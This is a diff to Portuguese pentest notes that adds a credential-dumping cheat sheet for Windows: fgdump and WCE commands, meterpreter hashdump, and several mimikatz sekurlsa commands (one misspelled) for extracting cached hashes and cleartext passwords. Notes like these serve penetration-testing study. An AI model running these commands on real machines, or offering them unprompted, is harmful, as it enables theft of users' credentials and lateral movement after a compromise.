@@ -170,15 +170,37 @@ vssadmin - utilitario para criar uma copia sombra dos volumes que tem no windows
 
 Obtendo hashes e senhas em cache
 
+**fgdump**
+
 fgdump.exe --> Permite conseguir acessar informações que estão na cache, credenciais. 
 
 type arquivo.pwdump
 
 type arquivo.cachedump
 
+**WCE **
+
 wce-universal.exe --> Ler informações de cache e exibe credenciais em texto claro.
 
 wce-universal.exe -w
+
+meterpreter > hashdump
+
+**MIMIKATZ**
+
+meterpreter > load mimikatz
+
+meterpreter > wdigest
+
+meterpreter > mimikatz_command -f sekurlsa::wdigest -a full
+
+meterpreter > mimikatz_command -f sekurlsa::serchPasswords
+
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords
+
+
+
+
 
 
 
